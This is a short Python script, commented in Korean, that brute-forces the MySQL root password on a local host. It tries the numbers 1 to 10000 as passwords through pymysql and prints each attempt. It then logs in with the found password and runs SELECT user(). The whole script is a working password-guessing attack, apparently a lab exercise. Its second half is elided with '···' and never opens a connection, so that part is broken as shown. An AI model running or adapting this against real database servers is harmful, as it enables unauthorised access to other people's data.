import pymysql

#MySQL 접속 정보
user = "root"
host = "127.0.0.1"
port = 3306

# root 계정 로그인 시도
for i in range(1, 10001):
     password = str(i)
     try:
         conn = pymysql.connect(user=user, password=password, host=host, port=port, charset='utf8')
         print(f"[+] Success! Password: {password}")
         conn.close()
         break
     except Exception as e:
         print(f"[-] Failed: {password}")

# root 계정으로 접속 시도
···
password = "찾은 비밀번호"

···

cursor = conn.cursor()
cursor.execute("SELECT user()")

result = cursor.fetchone()
print(f"user account: {result[0]}")

conn.close()
